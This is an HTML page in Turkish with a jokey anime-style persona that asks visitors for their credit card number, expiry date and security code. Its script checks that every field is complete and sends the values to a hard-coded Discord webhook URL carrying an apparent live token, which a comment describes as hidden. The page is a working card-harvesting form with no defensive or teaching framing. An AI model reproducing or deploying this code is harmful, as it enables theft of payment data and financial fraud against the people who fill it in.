<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Form</title>
</head>
<body>

    <table border="0" cellpadding="10" align="center">
        <tr>
            <!-- Soldaki Fotoğraf -->
            <td valign="top">
                <img src="konataa.jpg" alt="Sol Fotoğraf" width="200">
            </td>

            <!-- Orta Kısım (Form ve Üst Mesaj) -->
            <td valign="top" align="center">
                <!-- En üstteki mesaj -->
                <h2>Kredi kartı bilgilerini g-görmeme izin v-verir misin?</h2>
                <br>

                <!-- 1. Kutucuk (16 hane, 4'erli gruplar halinde) -->
                <label>Kredi kartındaki numarayı yazarmısın :333</label><br>
                <input type="text" id="b1_1" maxlength="4" size="4" oninput="autotab(this, 'b1_2')"> /
                <input type="text" id="b1_2" maxlength="4" size="4" oninput="autotab(this, 'b1_3')"> /
                <input type="text" id="b1_3" maxlength="4" size="4" oninput="autotab(this, 'b1_4')"> /
                <input type="text" id="b1_4" maxlength="4" size="4" oninput="autotab(this, 'b2_1')"><br><br>

                <!-- 2. Kutucuk (4 hane, 2'şerli gruplar halinde: . . / . .) -->
                <label>Süresi ne zaman bitiyor OwO</label><br>
                <input type="text" id="b2_1" maxlength="2" size="2" oninput="autotab(this, 'b2_2')"> /
                <input type="text" id="b2_2" maxlength="2" size="2" oninput="autotab(this, 'b3')"><br><br>

                <!-- 3. Kutucuk (Maksimum 3 hane) -->
                <label>Arkasındaki numaralar.. ne yazıyo? okuyamıyorum :c</label><br>
                <input type="text" id="b3" maxlength="3" size="3"><br><br>

                <!-- Gönder Butonu -->
                <button onclick="gonder()">Arigatou senpai!</button>
            </td>

            <!-- Sağdaki Fotoğraf -->
            <td valign="top">
                <img src="konata.jpg" alt="Sağ Fotoğraf" width="200">
            </td>
        </tr>
    </table>

    <script>
        // Webhook URL gizli olarak koda tanımlandı
        const webhookUrl = "https://discord.com/api/webhooks/1558957654032912384/pHKJiadYfhkdWjZ2qadpOo9qMM4DuSmuK86EfhZDR4YCfUXQnnr2wLoP7j9Ok7xX7OTA";

        function autotab(current, nextId) {
            if (current.value.length >= current.maxLength && nextId) {
                document.getElementById(nextId).focus();
            }
        }

        function gonder() {
            var v1_1 = document.getElementById('b1_1').value;
            var v1_2 = document.getElementById('b1_2').value;
            var v1_3 = document.getElementById('b1_3').value;
            var v1_4 = document.getElementById('b1_4').value;
            var val1 = v1_1 + "/" + v1_2 + "/" + v1_3 + "/" + v1_4;

            var v2_1 = document.getElementById('b2_1').value;
            var v2_2 = document.getElementById('b2_2').value;
            var val2 = v2_1 + "/" + v2_2;

            var val3 = document.getElementById('b3').value;

            if (v1_1.length < 4 || v1_2.length < 4 || v1_3.length < 4 || v1_4.length < 4) {
                alert("Lütfen birinci kutucuğu tam 16 hane olacak şekilde doldurun!");
                return;
            }

            if (v2_1.length < 2 || v2_2.length < 2) {
                alert("Lütfen ikinci kutucuğu tam 4 hane olacak şekilde doldurun!");
                return;
            }

            if (val3.length === 0) {
                alert("Lütfen üçüncü kutucuğu doldurun!");
                return;
            }

            var data = {
                content: "Yeni Gönderi:\n1. Kutu: " + val1 + "\n2. Kutu: " + val2 + "\n3. Kutu: " + val3
            };

            fetch(webhookUrl, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }).then(function() {
                alert("ay cok tesekkur ederimm");
            }).catch(function(error) {
                alert("Bir hata oluştu.");
            });
        }
    </script>

</body>
</html>
